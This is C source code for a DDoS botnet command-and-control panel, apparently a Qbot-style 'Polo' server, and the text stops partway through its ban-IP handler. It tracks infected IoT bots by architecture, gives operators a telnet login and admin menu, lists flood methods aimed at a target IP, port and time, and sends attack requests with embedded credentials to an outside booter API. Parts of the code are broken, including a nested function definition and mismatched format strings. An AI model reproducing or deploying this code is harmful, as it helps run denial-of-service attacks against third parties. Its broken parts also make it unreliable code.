#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define blazingsbigpenisinch 100000
#define userfile "users/login.txt"
#define MAXFDS 1000000

char *apiip = "securityteamapi.io";

char *ipinfo[800];

struct login {
	char username[100];
	char password[100];
	char admin[50];
};
static struct login accounts[100];
struct clientdata_t {
	    uint32_t ip;
		char x86;
		char ARM;
		char mips;
		char mpsl;
		char ppc;
		char spc;
		char unknown;
	char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};


FILE *LogFile2;
FILE *LogFile3;

static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int DUPESDELETED = 0;


int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
int resolvehttp(char *  , char *);
int resolvehttp(char * site , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
int apicall(char *type, char *ip, char *port, char *method, char *time)
{
    int Sock = -1;
    char request[1024];
    char host_ipv4[20];
    struct sockaddr_in s;
    struct timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 3;
    Sock = socket(AF_INET, SOCK_STREAM, 0);
    s.sin_family = AF_INET;
    s.sin_port = htons(80);
    resolvehttp(apiip, host_ipv4);
    s.sin_addr.s_addr = inet_addr(host_ipv4);
    if(strstr(type, "spoofed"))
 {//https://securityteamapi.io/api.php?ip=%s&port=%s&time=%s&method=%s&vip=NO&user=BlazingOVH1&key=blazing
        snprintf(request, sizeof(request), "GET /api.php?ip=%s&port=%s&time=%s&method=%s&vip=NO&user=BlazingOVH&key= HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/596.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/596.36\r\nConnection: close\r\n\r\n", ip, port, method, time, apiip);
    }///api.php?user=blazingOVH1&key=blazing1&host=%s&port=%s&method=%s&time=%s
    if(connect(Sock, (struct sockaddr *)&s, sizeof(s)) == -1)
    return;
    else
    {
        send(Sock, request, strlen(request), 0);
        char ch;
        int ret = 0;
        uint32_t header_parser = 0;
        while (header_parser != 0x0D0A0D0A)
        {
            if ((ret = read(Sock, &ch, 1)) != 1)
                break;
            header_parser = (header_parser << 8) | ch;
        }
        ret = 0;
        char buf[512];
        while(ret = read(Sock, buf, sizeof(buf)-1))
        {
            buf[ret] = '\0';
            if(strlen(buf) > 0)
            {
                if(strstr(buf, "Failed to connect"))
                {
                    close(Sock);
                    memset(buf, 0, sizeof(buf));
                    return 1;
                }
            }
        }
        close(Sock);
        memset(buf, 0, sizeof(buf));
    }
    return 0;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;90m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].ARM = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

					if (dup)
					{
						DUPESDELETED++;
						continue;
					}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->ARM = 0;
		        client->mips = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "ARM4") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM5") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM6") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "MIPS") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}					
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}					
																							
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf(" \"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->ARM = 0;
		            client->mips = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ARM) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }
 
        return total;
}


unsigned int botsconnect()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("users/login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}



void checkHostName(int hostname) 
{ 
    if (hostname == -1) 
    { 
        perror("gethostname"); 
        exit(1); 
    } 
} 
 void client_addr(struct sockaddr_in addr){

        sprintf(ipinfo, "%d.%d.%d.%d",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
    }

void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; IoT: %d | %c", '\033', botsconnect(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}

       
void *BotWorker(void *sock)
 {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	char* admin = "admin";
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);
	
	FILE *fp;
	int i=0;
	int c;
	fp=fopen("users/login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s", accounts[j].username, accounts[j].password, accounts[j].admin);
		++j;
		
	}	
	void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; IoT: %d  %c", '\033', botsconnect(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[2J\033[1;1H");
		char user [5000];	
        {
		char username [5000];
        sprintf(username, "\e[90mUser\e[90m:\e[90m\e[96m: ", accounts[find_line].username);
		if(send(datafd, username, strlen(username), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);

        char nickstring[96];
	    snprintf(nickstring, sizeof(nickstring), "%s", buf);
	    memset(buf, 0, sizeof(buf));
	    trim(nickstring);
	    find_line = Find_Login(nickstring);
        if(strcmp(accounts[find_line].username, nickstring) != 0) goto failed;
        memset(buf, 0, 2048);

        if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

		char password [5000];
        sprintf(password, "\e[90mPass\e[90m:\e[90m\e[96m: ", accounts[find_line].password);

		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        char *password1 = ("%s", buf);
        trim(password1);
        if(strcmp(accounts[find_line].password, password1) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
       }
        failed:
			if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			FILE *iplog;
            iplog = fopen("logs/fail-login.txt", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(iplog, "[%s]: Fail: %s |\n", formatted_gmt, ipinfo);
            fclose(iplog);
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		        char banner1  [800];
		        char banner2  [800];
		        char banner3  [800];
		        char *userlog  [800];



 char hostbuffer[256]; 
    int hostname; 
    hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
    checkHostName(hostname); 
  

FILE* fp1;
char motd[255];
char motd1[255];

fp1 = fopen("logs/motd.txt", "r");

while(fgets(motd, 255, (FILE*) fp1)) {
    sprintf(motd1, "%s\n", motd);
}
fclose(fp1);


         
		char clearscreen1 [2048];
				memset(clearscreen1, 0, 2048);
				sprintf(clearscreen1, "\033[2J\033[1;1H");
				sprintf(banner1,  "\e[96m                             ╔═╗┌─┐┬  ┌─┐                                \r\n");
				sprintf(banner2,  "\e[90m                             ╠═╝│ ││  │ │                                \r\n");
				sprintf(banner3,  "\e[96m                             ╩  └─┘┴─┘└─┘                                \r\n");
				if(send(datafd, clearscreen1,  strlen(clearscreen1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 



		while(1) {
		char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   

      if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "?") || strstr(buf, "helpme") || strstr(buf, "Help")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char help1  [800];
				char help2  [800];
				char help3  [800];
				char help4  [800];
				char help5  [800];
				char help6  [800];
				char help7  [800];
				char help8  [800];
				char help9  [800];
				char help10  [800];
				char help11  [800];
				char help12  [800];

                sprintf(help1,  "\e[96m ╔═════════════════\e[96m═════════════════╗  \e[90m\r\n");
				sprintf(help2,  "\e[90m ║ bots    | shows \e[90mbot count        ║  \e[96m\r\n");
				sprintf(help3,  "\e[96m ║ spoof   | shows \e[96mspoofed methods  ║  \e[90m\r\n");
				sprintf(help4,  "\e[90m ║ myip    | shows \e[90myour ip          ║  \e[96m\r\n");//Polo source | first source to have a my ip function
				sprintf(help5,  "\e[96m ║ bots    | shows \e[96mbot count        ║  \e[90m\r\n");
				sprintf(help6,  "\e[90m ║ clear   | clears\e[90m the screen      ║  \e[96m\r\n");
				sprintf(help7,  "\e[96m ║ methods | all me\e[96mthods bot has    ║  \e[90m\r\n");
    		    sprintf(help8,  "\e[90m ║ support | open t\e[90micket to staff   ║  \e[96m\r\n");
    		    sprintf(help9,  "\e[96m ║ info    | info a\e[96mout the net      ║  \e[90m\r\n");
    		    sprintf(help10, "\e[90m ║ Admin   | Admin \e[90mcommands         ║  \e[96m\r\n");
    		    sprintf(help11, "\e[96m ║ API     | Built \e[96min API!          ║  \e[90m\r\n");
                sprintf(help12, "\e[96m ╚═════════════════\e[96m═════════════════╝  \e[96m\r\n");
                
				if(send(datafd, help1,  strlen(help1),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help2,  strlen(help2),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help3,  strlen(help3),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help4,  strlen(help4),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help5,  strlen(help5),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help6,  strlen(help6),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help7,  strlen(help7),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help8,  strlen(help8),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help9,  strlen(help9),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help10,  strlen(help10),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help11,  strlen(help11),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help12,  strlen(help12),  MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[96mPolo ~ \e[96m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 		      if(strstr(buf, "admin") || strstr(buf, "Admin") || strstr(buf, "ADMIN") || strstr(buf, "adm") || strstr(buf, "admin")) {
 		      					{
					if(!strcmp(accounts[find_line].admin, "admin"))
					{
				pthread_create(&title, NULL, &TitleWriter, sock);
				char admin1  [800];
				char admin2  [800];
				char admin3  [800];
				char admin4  [800];
				char admin5  [800];
				char admin6  [800];
				char admin7  [800];
				char admin8  [800];

                sprintf(admin1,  "\e[96m ╔═════════════════\e[96m═════════════════╗  \e[96m\r\n");
				sprintf(admin2,  "\e[90m ║ logs    | Shows \e[96mall logs         ║  \e[90m\r\n");
				sprintf(admin3,  "\e[90m ║ banip   | shows \e[90mspoofed methods  ║  \e[90m\r\n");
				sprintf(admin4,  "\e[90m ║ unbanip | all me\e[96mthods bot has    ║  \e[90m\r\n");
    		    sprintf(admin5,  "\e[90m ║ ss      | Read A\e[90mll the tickets   ║  \e[90m\r\n");
    		    sprintf(admin6,  "\e[90m ║ info    | info a\e[96mout the net      ║  \e[90m\r\n");
    		    sprintf(admin7,  "\e[90m ║ Admin   | shows \e[90mthis box         ║  \e[90m\r\n");// Format: user pass admin
                sprintf(admin8,  "\e[96m ╚═════════════════\e[96m═════════════════╝  \e[96m\r\n");
                
				if(send(datafd, admin1,  strlen(admin1),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, admin2,  strlen(admin2),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, admin3,  strlen(admin3),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, admin4,  strlen(admin4),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, admin5,  strlen(admin5),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, admin6,  strlen(admin6),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, admin7,  strlen(admin7),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, admin8,  strlen(admin8),  MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[96mPolo ~ \e[96m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 	}
 }
       if(strstr(buf, "Info") || strstr(buf, "INFO") || strstr(buf, "info") || strstr(buf, "information") || strstr(buf, "INFORMATION")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char info1  [800];
				char info2  [800];
				char info3  [800];
				char info4  [800];

                sprintf(info1,  "\e[90m ╔════════════════════\e[90m════════════════════╗  \e[90m\r\n");
				sprintf(info2,  "\e[90m ║ lol     | main owne\e[96mr/developer!        ║  \e[90m\r\n");
				sprintf(info3,  "\e[90m ║ lol     | Helping w\e[96mith some functions  ║  \e[90m\r\n");
                sprintf(info4,  "\e[90m ╚════════════════════\e[96m════════════════════╝  \e[90m\r\n");
                
				if(send(datafd, info1,  strlen(info1),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, info2,  strlen(info2),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, info3,  strlen(info3),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, info4,  strlen(info4),  MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[96mPolo ~ \e[96m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 		      if(strstr(buf, "Spoof") || strstr(buf, "spoof") || strstr(buf, "SPOOF") || strstr(buf, "spoofed") || strstr(buf, "SPOOFED")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char spoofed1  [800];
				char spoofed2  [800];
				char spoofed3  [800];

                sprintf(spoofed1,  "\e[90m ╔═════════════════\e[90m═════════════════╗  \e[90m\r\n");
				sprintf(spoofed2,  "\e[96m ║          IN DEVE\e[96mLOPMENT          ║  \e[96m\r\n");
				sprintf(spoofed3,  "\e[90m ╚═════════════════\e[90m═════════════════╝  \e[90m\r\n");
                
				if(send(datafd, spoofed1,  strlen(spoofed1),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, spoofed2,  strlen(spoofed2),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, spoofed3,  strlen(spoofed3),  MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[96mPolo ~ \e[96m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
 		 		if(strstr(buf, "IPLOOKUP") || strstr(buf, "MYIP") || strstr(buf, "myip") || strstr(buf, "IP") || strstr(buf, "MYIP")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char lookup1  [800];
				char lookup2  [800];
				char lookup3  [800];

                sprintf(lookup1,  "\e[90m ═════════════════\e[90m═══════════════════  \e[90m\r\n");
				sprintf(lookup2,  "\e[96m        Your IP is\e[96m: %s                 \e[96m\r\n", ipinfo);
				sprintf(lookup3,  "\e[90m ═════════════════\e[90m═══════════════════  \e[90m\r\n");
                
				if(send(datafd, lookup1,  strlen(lookup1),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lookup2,  strlen(lookup2),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lookup3,  strlen(lookup3),  MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[96mPolo ~ \e[96m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if (strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "count") || strstr(buf, "COUNT")) {
            char synpur1[128];
            char synpur2[128];
            char synpur3[128];
            char synpur4[128];
            char synpur5[128];
            char synpur6[128];
            char synpur7[128];
            char synpur8[128];

            if(x86Connected() != 0)// should i add u in this call ye
            {
                sprintf(synpur1,"\e[96mx86: [%d] \e[96m\r\n",     x86Connected());
                if(send(datafd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
            }
            if(armConnected() != 0)
            {
                sprintf(synpur2,"\e[96marm: [%d] \e[96m\r\n",     armConnected());
                if(send(datafd, synpur2, strlen(synpur2), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mipsConnected() != 0)
            {
                sprintf(synpur3,"\e[96mmips: [%d] \e[96m\r\n",     mipsConnected());
                if(send(datafd, synpur3, strlen(synpur3), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mpslConnected() != 0)
            {
                sprintf(synpur4,"\e[96mmpsl: [%d] \e[96m\r\n",     mpslConnected());
                if(send(datafd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
            }
            if(ppcConnected() != 0)
            {
                sprintf(synpur5,"\e[96mppc: [%d] \e[96m\r\n",     ppcConnected());
                if(send(datafd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
            }
            if(spcConnected() != 0)
            {
                sprintf(synpur6,"\e[96mspc: [%d] \e[96m\r\n",     spcConnected());
                if(send(datafd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
            }
            if(unknownConnected() != 0)
            {
                sprintf(synpur7,"\e[96munknow: [%d] \e[96m\r\n",     unknownConnected());
                if(send(datafd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
            }
               sprintf(synpur8, "\e[96mcount: [%d] \e[96m\r\n",  botsconnect());
               if(send(datafd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;
            
			pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);

		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "method") || strstr(buf, "Method") ||  strstr(buf, "ATTACK") || strstr(buf, "Attack") || strstr(buf, "attack") || strstr(buf, "METHOD")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char attack0  [800];
				char attack1  [800];
				char attack2  [800];
				char attack3  [800];
				char attack4  [800];
				char attack5  [800];
				char attack6  [800];
				char attack7  [800];
				
                sprintf(attack0,  "\e[90m  ╔═══════════════════════\e[90m═══════════════════════════╗  \e[90m\r\n");  
				sprintf(attack1,  "\e[90m  ║ !* STD IP PORT TIME - \e[90mcustom stdhex              ║  \e[90m\r\n");
				sprintf(attack2,  "\e[90m  ║ !* RANDHEX IP PORT TIM\e[90mE - Random hex string      ║  \e[90m\r\n"); 
				sprintf(attack3,  "\e[90m  ║ !* OVH IP PORT TIME 10\e[90m24 - L7 hex flood          ║  \e[90m\r\n");
				sprintf(attack4,  "\e[90m  ║ !* UDPRAW IP PORT TIME\e[90m - Raw UDPHEX flood        ║  \e[90m\r\n");   
				sprintf(attack5,  "\e[90m  ║ !* GAME IP PORT TIME -\e[90m VSEHEX flood              ║  \e[90m\r\n");   
				sprintf(attack6,  "\e[90m  ║ !* XTD IP PORT TIME - \e[90mCustom flood               ║  \e[90m\r\n");     
                sprintf(attack7,  "\e[90m  ╚═══════════════════════\e[90m═══════════════════════════╝  \e[90m\r\n");  

                if(send(datafd, attack0,  strlen(attack0),	MSG_NOSIGNAL) == -1) goto end;               
				if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack2,  strlen(attack2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack3,  strlen(attack3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack4,  strlen(attack4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack5,  strlen(attack5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack6,  strlen(attack6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack7,  strlen(attack7),	MSG_NOSIGNAL) == -1) goto end;


				pthread_create(&title, NULL, &TitleWriter, sock);
				char input [5000];
        sprintf(input, "\e[96m%s\e[96mPolo ~ \e[96m", userlog);

		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "banip")) 
				{
					if(!strcmp(accounts[find_line].admin, "admin"))
					{
						pthread_create(&title, NULL, &TitleWriter, sock);
						char bannie111[40];
						char commandban[80];
						char commandban1[80];
						if(send(datafd, "\x1b[0mip: \x1b[96m", strlen("\x1b[0mip: \x1b[96m"), MSG_NOSIGNAL) == -1) goto end;
						memset(bannie111, 0, sizeof(bannie111));
